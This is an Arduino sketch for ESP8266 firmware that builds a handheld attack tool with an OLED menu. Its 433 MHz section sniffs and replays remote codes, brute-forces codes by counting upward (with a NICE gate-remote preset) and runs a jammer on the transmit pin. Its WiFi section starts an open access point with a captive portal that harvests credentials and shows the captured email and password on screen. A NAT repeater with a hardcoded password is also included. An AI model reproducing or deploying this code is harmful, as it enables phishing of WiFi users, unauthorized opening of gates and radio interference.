/********************************************************************
  Created by Mateusz Bielak
  Modif danya201272

https://github.com/olikraus/U8g2_Arduino

https://github.com/neu-rah/ArduinoMenu/releases

https://github.com/FastLED/FastLED/releases

https://github.com/sui77/rc-switch

https://github.com/neu-rah/streamFlow

https://github.com/geneReeves/ArduinoStreaming

  

********************************************************************/
#include <Arduino.h>
#include <Wire.h>
#include <U8g2lib.h>


#include <menu.h>
#include <menuIO/u8g2Out.h>
#include <menuIO/keyIn.h>
#include <menuIO/chainStream.h>
#include <menuIO/serialOut.h>
#include <menuIO/serialIn.h>

#define USE_SSD1306
#define fontX 7
#define fontY 16
#define offsetX 0
#define offsetY 3
#define U8_Width 128
#define U8_Height 64
#define USE_HWI2C
U8G2_SSD1306_128X64_NONAME_F_SW_I2C u8g2(U8G2_R0, 12, 14, U8X8_PIN_NONE);

#include <ESP8266WiFi.h>
#include <DNSServer.h> 
#include <ESP8266WebServer.h>

using namespace Menu;

const colorDef<uint8_t> colors[6] MEMMODE={
  {{0,0},{0,1,1}},//bgColor
  {{1,1},{1,0,0}},//fgColor
  {{1,1},{1,0,0}},//valColor
  {{1,1},{1,0,0}},//unitColor
  {{0,1},{0,0,1}},//cursorColor
  {{1,1},{1,0,0}},//titleColor
};


#include "config.h"
#include "wificaptive.h"
#include "repeater.h"
#include <RCSwitch.h>
RCSwitch mySwitch = RCSwitch();

#include <EEPROM.h>

long value;
long frequency;
int bitlength;
int protocol; // Variables 
int pulselength; 
int sniffSW;
int repeat;
int btfSW;
int swcounter;
int jammerSW; 
int wificapSW;
int repeaterSW;




const char* const alphaNum[] MEMMODE = {" 0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz.,+-_"};
char wifinamechar[]="                                    ";
char  wifipasschar[]="                                   ";



result info(eventMask e, prompt &item);
result datasniff(eventMask e, prompt &item);
result datawifi(eventMask e, prompt &item);

result reset(eventMask e) {        // Reset function 
value = 0;
protocol = 0;
bitlength = 0;
pulselength = 0;
repeat = 2;
frequency = 1000; 
return proceed;
}

result jammerswOn() {
  jammerSW = 1 ;
  return proceed;
}

result jammerswOff() {
  jammerSW = 0 ;
  //noTone(15); 
  analogWriteFreq(0);
  analogWrite(15,0);
  return proceed;
}


// Sniff on/off

result sniffOn() {
  mySwitch.resetAvailable();
  sniffSW = 1 ;
  value = mySwitch.getReceivedValue();
  bitlength = mySwitch.getReceivedBitlength();
  protocol = mySwitch.getReceivedProtocol();
  pulselength = mySwitch.getReceivedDelay() ;
  return proceed;
}

result sniffOff() {
  sniffSW = 0 ;
  return proceed;
}

// End Sniff

// Bruteforce on/off
result btfswOn() {
  btfSW = 1;
  mySwitch.setProtocol(protocol);
  mySwitch.setPulseLength(pulselength);
  return proceed;
}

result btfswOff() {
  btfSW = 0;
  return proceed;
}

// End Bruteforce On/OFf

//Wifi

result wifiswOn() {
  
   bootTime = lastActivity = millis();
   WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(SSID_NAME);
  dnsServer.start(DNS_PORT, "*", APIP);
  webServer.on("/post",[]() { webServer.send(HTTP_CODE, "text/html", posted()); BLINK(); });
  webServer.on("/creds",[]() { webServer.send(HTTP_CODE, "text/html", creds()); });
  webServer.on("/clear",[]() { webServer.send(HTTP_CODE, "text/html", clear()); });
  webServer.onNotFound([]() { lastActivity=millis(); webServer.send(HTTP_CODE, "text/html", index()); });
  webServer.begin();
  pinMode(BUILTIN_LED, OUTPUT);
  digitalWrite(BUILTIN_LED, HIGH);
   
  return proceed;
}

result wifiswOff() {
 WiFi.mode(WIFI_OFF);
  
  return proceed;
}


result repeaterswOn() {
String wifiname(wifinamechar);
 String wifipass(wifipasschar);
wifiname.trim();
  wifipass.trim();
#if HAVE_NETDUMP
  phy_capture = dump;
#endif

  // first, connect to STA so we can get a proper local DNS server
 
  WiFi.mode(WIFI_STA);
  WiFi.begin(wifiname, wifipass);
 // while (WiFi.status() != WL_CONNECTED) {
   // Serial.print('.');
    //delay(500);
  //}
  Serial.printf("\nSTA: %s (dns: %s / %s)\n",
                WiFi.localIP().toString().c_str(),
                WiFi.dnsIP(0).toString().c_str(),
                WiFi.dnsIP(1).toString().c_str());

  // give DNS servers to AP side
  auto& server1 = WiFi.softAPDhcpServer();
  server1.setDns(WiFi.dnsIP(0));
  server1.setDns(WiFi.dnsIP(1));

  WiFi.softAPConfig( // Set IP Address, Gateway and Subnet
  IPAddress(192, 168, 100, 1),
  IPAddress(192, 168, 100, 1),
  IPAddress(255, 255, 255, 0));
  WiFi.softAP("ext", "password1234");
  Serial.printf("AP: %s\n", WiFi.softAPIP().toString().c_str());

  Serial.printf("Heap before: %d\n", ESP.getFreeHeap());
  err_t ret = ip_napt_init(NAPT, NAPT_PORT);
  Serial.printf("ip_napt_init(%d,%d): ret=%d (OK=%d)\n", NAPT, NAPT_PORT, (int)ret, (int)ERR_OK);
  if (ret == ERR_OK) {
    ret = ip_napt_enable_no(SOFTAP_IF, 1);
    Serial.printf("ip_napt_enable_no(SOFTAP_IF): ret=%d (OK=%d)\n", (int)ret, (int)ERR_OK);
    if (ret == ERR_OK) {
     // Serial.printf("WiFi Network '%s' with same password is now NATed behind '%s'\n", wifiname ,"extender", wifipass);
    }
  }
  Serial.printf("Heap after napt init: %d\n", ESP.getFreeHeap());
  if (ret != ERR_OK) {
    Serial.printf("NAPT initialization failed\n");
    
  }

  
  return proceed;
}

result repeaterswOff() {
 WiFi.mode(WIFI_OFF);
  
  return proceed;
}

//End Wifi


TOGGLE(btfSW, btfsw, "Start|Stop", doNothing, noEvent, noStyle //,doExit,enterEvent,noStyle        // Bruteforce switch  on/off
       
       , VALUE("[Off]", 0, btfswOff, enterEvent)
       , VALUE("[On]", 1, btfswOn, enterEvent)
      );

TOGGLE(sniffSW, sniffsw, "Start|Stop", doNothing, noEvent, noStyle //,doExit,enterEvent,noStyle    // Sniff Switch on/off
       
       , VALUE("[Off]", 0, sniffOff, enterEvent)
       , VALUE("[On]", 1, sniffOn, enterEvent)
      );


TOGGLE(jammerSW, jammersw, "Start|Stop", doNothing, noEvent, noStyle //,doExit,enterEvent,noStyle    
       
       , VALUE("[Off]", 0, jammerswOff, enterEvent)
       , VALUE("[On]", 1,  jammerswOn, enterEvent)
      );


      TOGGLE(wificapSW, wifisw, "Start|Stop", doNothing, noEvent, noStyle //,doExit,enterEvent,noStyle   
       
       , VALUE("[Off]", 0, wifiswOff, enterEvent)
       , VALUE("[On]", 1,  wifiswOn, enterEvent)
      );


      TOGGLE(repeaterSW, repeatersw, "Start|Stop", doNothing, noEvent, noStyle //,doExit,enterEvent,noStyle   
       
       , VALUE("[Off]", 0, repeaterswOff, enterEvent)
       , VALUE("[On]", 1,  repeaterswOn, enterEvent)
      );


result rcrcv() {        // Empty shell for field option 

  
  return proceed;
}


result snd() {
  do {
  mySwitch.setProtocol(protocol);
  mySwitch.setPulseLength(pulselength);
  mySwitch.send(value, bitlength);            // Send function
  swcounter++ ;
  delay(1);  // necessary!! without delay after 10 repeat's gives restart 
    
  } while ( swcounter <= repeat );
  swcounter = 1 ;
  repeat = 2 ;
  return proceed;
}





result showEvent(eventMask e, navNode& nav, prompt& item) {

  return proceed;
}






// MENU




MENU(Repeater, "Repeater", showEvent, anyEvent, noStyle
    , SUBMENU(repeatersw) 
    ,EDIT("Name",wifinamechar,alphaNum,doNothing,noEvent,noStyle) // TESTY
    ,EDIT("Password",wifipasschar,alphaNum,doNothing,noEvent,noStyle) // TESTY
    , EXIT("<Back")
    );


MENU(CaptivePortal, "CaptivePortal", showEvent, anyEvent, noStyle
    , SUBMENU(wifisw) 
    , OP("Show CapData", dtwifi, enterEvent)
    , EXIT("<Back")
    );



MENU(Wifi, "Wifi", showEvent, anyEvent, noStyle                                    
    , SUBMENU(CaptivePortal) 
    , SUBMENU(Repeater) 
    , EXIT("<Back")
     );


MENU(Jammer, "Jammer", showEvent, anyEvent, noStyle                                    // Sniffing Sub-Submenu
    , FIELD(frequency, "Freq: ", "Hz", 0, 65535, 1000, 100, rcrcv, enterEvent, wrapStyle)      // Set variables value
    , SUBMENU(jammersw)                                                                 // Submenu Sniffer
    , OP("Reset", reset, enterEvent)                                                    // Reset
    , EXIT("<Back")
     );



MENU(BruteForce, "BruteForce-slow", showEvent, anyEvent, noStyle                        // Bruteforce Sub-Submenu 
    , SUBMENU(btfsw)                                                                    // Switch on/off
    , OP("NICE12Bit", nice, enterEvent)
    , FIELD(value, "Code: ", "", 0, 1000000000, 1000, 10, rcrcv, enterEvent, wrapStyle)   // Set variables value
    , FIELD(bitlength, "Bitlength: ", "", 0, 500, 10, 1, rcrcv, enterEvent, wrapStyle)   // Set variables value
    , FIELD(protocol, "Protocol: ", "", 0, 100, 10, 1, rcrcv, enterEvent, wrapStyle)     // Set variables value
    , FIELD(pulselength, "Pulselength: ", "", 0, 3000, 10, 1, rcrcv, enterEvent, wrapStyle)
    , OP("Reset", reset, enterEvent)                                                    // Reset
    , EXIT("<Back")                                                                     // Exit
     );

MENU(Send, "Send", showEvent, anyEvent, noStyle                                           // Send Sub-Submenu 
    , OP("[Send]", snd, enterEvent)                                                       // Send 
    , FIELD(value, "Code: ", "", 0, 10000000000, 100, 1, rcrcv, enterEvent, wrapStyle)     // Set variables value
    , FIELD(bitlength, "Bitlength: ", "", 0, 500, 10, 1, rcrcv, enterEvent, wrapStyle)     // Set variables value
    , FIELD(protocol, "Protocol: ", "", 0, 100, 10, 1, rcrcv, enterEvent, wrapStyle)       // Set variables value
    , FIELD(pulselength, "Pulselength: ", "", 0, 3000, 10, 1, rcrcv, enterEvent, wrapStyle)
    , FIELD(repeat, "Repeat: ", "x", 0, 1000, 10, 1, rcrcv, enterEvent, wrapStyle)         // Set variables value
    , OP("Reset", reset, enterEvent)                                                      // Reset
    , EXIT("<Back")                                                                       // Exit
     );

MENU(Save,"Save",doNothing,anyEvent,wrapStyle
  ,OP("Slot 1",Save1,enterEvent)
  ,OP("Slot 2",Save2,enterEvent)
  ,OP("Slot 3",Save3,enterEvent)
  ,OP("Slot 4",Save4,enterEvent)
  ,OP("Slot 5",Save5,enterEvent)
  ,OP("Slot 6",Save6,enterEvent)
  ,OP("Slot 7",Save7,enterEvent)
  ,OP("Slot 8",Save8,enterEvent)
  ,OP("Slot 9",Save9,enterEvent)
  ,EXIT("<Back")
);


MENU(Load,"Load",doNothing,anyEvent,wrapStyle
  ,OP("Slot 1",Load1,enterEvent)
  ,OP("Slot 2",Load2,enterEvent)
  ,OP("Slot 3",Load3,enterEvent)
  ,OP("Slot 4",Load4,enterEvent)
  ,OP("Slot 5",Load5,enterEvent)
  ,OP("Slot 6",Load6,enterEvent)
  ,OP("Slot 7",Load7,enterEvent)
  ,OP("Slot 8",Load8,enterEvent)
  ,OP("Slot 9",Load9,enterEvent)
  ,EXIT("<Back")
);

MENU(Snif, "Sniff", showEvent, anyEvent, noStyle                                    // Sniffing Sub-Submenu
    , FIELD(value, "Code: ", "", 0, 10000000000, 100000, 1, rcrcv, enterEvent, wrapStyle)      // Set variables value
    , SUBMENU(sniffsw)                                                                 // Submenu Sniffer
    , OP("Show Data", dtsnf, enterEvent)
    , OP("Reset", reset, enterEvent)                                                    // Reset
    , EXIT("<Back")
     );


     
MENU(rf, "RF_433", showEvent, anyEvent, noStyle                                       // Rf433 Submenu
     , SUBMENU(Snif)                                                                  // Sniff Submenu
     , SUBMENU(Send)                                                                  // Send Submenu
     , SUBMENU(BruteForce)                                                            // Bruteforce Submenu
     , SUBMENU(Jammer)
     , SUBMENU(Save)
     , SUBMENU(Load)
     , EXIT("<Back")                                                                  // Exit
    );



    MENU(mainMenu, "Main menu", doNothing, noEvent, wrapStyle                          // Mainmenu 
    , SUBMENU(rf)                                                                      // Rf_433 Submenu
    , SUBMENU(Wifi)  
    , OP("Info", inf, enterEvent)
    //, EXIT("<Back")
    );


//END MENU


#ifdef NAV_BUTTONS_INPUT_PULLUP
//build a map of keys to menu commands
keyMap joystickBtn_map[] = {
  { -BTN_SEL, defaultNavCodes[enterCmd].ch} ,
  { -BTN_UP, defaultNavCodes[upCmd].ch} ,
  { -BTN_DOWN, defaultNavCodes[downCmd].ch}  ,
  { -BTN_ESC, defaultNavCodes[escCmd].ch}  ,
};
keyIn<TOTAL_NAV_BUTTONS> joystickBtns(joystickBtn_map);//the input driver
#else
//build a map of keys to menu commands
keyMap joystickBtn_map[] = {
  { BTN_SEL, defaultNavCodes[enterCmd].ch} ,
  { BTN_UP, defaultNavCodes[upCmd].ch} ,
  { BTN_DOWN, defaultNavCodes[downCmd].ch}  ,
  { BTN_ESC, defaultNavCodes[escCmd].ch},
};

keyIn<TOTAL_NAV_BUTTONS> joystickBtns(joystickBtn_map);//the input driver
#endif

MENU_OUTPUTS(out,MAX_DEPTH
  ,U8G2_OUT(u8g2,colors,fontX,fontY,offsetX,offsetY,{0,0,U8_Width/fontX,U8_Height/fontY})
  ,SERIAL_OUT(Serial)
);

NAVROOT(nav, mainMenu, MAX_DEPTH, joystickBtns, out);


result info(menuOut& o, idleEvent e) {
  if (e == idling) {
    u8g2.setFont(u8g2_font_7x13_mf);
    o.setCursor(0, 0);
    o.print("Version 2.0");
    o.setCursor(0, 1);
    o.print("Author: MBiel" );
    o.setCursor(0, 2);
    o.print("Mod: danya201272");
    o.setCursor(0, 3);
    o.print("Ok to Exit...");
    u8g2.setFont(menuFont);
  }
  return proceed;
}


result inf(eventMask e, prompt &item) {
  nav.idleOn(info);
  return proceed;
}

result datasniff(menuOut& o, idleEvent e) {
  if (e == idling) {
    o.setCursor(0, 0);
    o.print(value);
    o.setCursor(0, 1);
    o.print(bitlength );
    o.setCursor(0, 2);
    o.print(protocol);
    o.setCursor(0, 3);
    o.print(pulselength);
  }
  return proceed;
}


result dtsnf(eventMask e, prompt &item) {
  nav.idleOn(datasniff);
  return proceed;
}

result nice(eventMask e, prompt &item) {
  protocol = 12;
  bitlength = 12;
  pulselength = 700;
  return proceed;
}


result datawifi(menuOut& o, idleEvent e) {
  if (e == idling) {
    u8g2.setFont(u8g2_font_7x13_mf);
    o.setCursor(0, 1);
    o.print(EML);
    o.setCursor(0, 2);
    o.print(PASS);
    u8g2.setFont(menuFont);
    o.setCursor(0, 3);
    o.print("Ok to Exit...");
  }
  return proceed;
}


result dtwifi(eventMask e, prompt &item) {
  nav.idleOn(datawifi);
  return proceed;
}

void setup() {
  Serial.begin(9600);
  u8g2.clearBuffer();
  Wire.begin();
  u8g2.begin();
  u8g2.setBitmapMode(1);
  mySwitch.enableReceive(rxPin);
  mySwitch.enableTransmit(txPin);
  WiFi.mode(WIFI_OFF);

  btfSW = 0;
  repeat = 2;
  swcounter = 1;
  jammerSW = 0;
  frequency = 1000;
  
  u8g2.setFont(menuFont);
  joystickBtns.begin();
}



void loop() {
  if (sniffSW == 1) {
  if (mySwitch.available()) {
    value = mySwitch.getReceivedValue();
    bitlength = mySwitch.getReceivedBitlength();
    protocol = mySwitch.getReceivedProtocol();
    pulselength = mySwitch.getReceivedDelay();
    mySwitch.resetAvailable();
  }
  }

  nav.doInput();

  if (nav.changed(0)) {//only draw if menu changed for gfx device
    u8g2.firstPage();
    do nav.doOutput(); while(u8g2.nextPage());
  }
  
  if (btfSW == 1) {                    // Bruteforce
    mySwitch.send(value, bitlength);
    mySwitch.send(value, bitlength);
    value++;
  }

  if (jammerSW == 1) {
    analogWriteFreq(frequency);
    analogWrite(txPin,512); // only for esp8266.If you using arduino, use tone(pin,freuency); in void loop, and comment this whole void tones.
  }
 
  if (wificapSW == 1) {
    if ((millis()-lastTick)>TICK_TIMER) {lastTick=millis();} 
  dnsServer.processNextRequest(); webServer.handleClient(); 
  }

}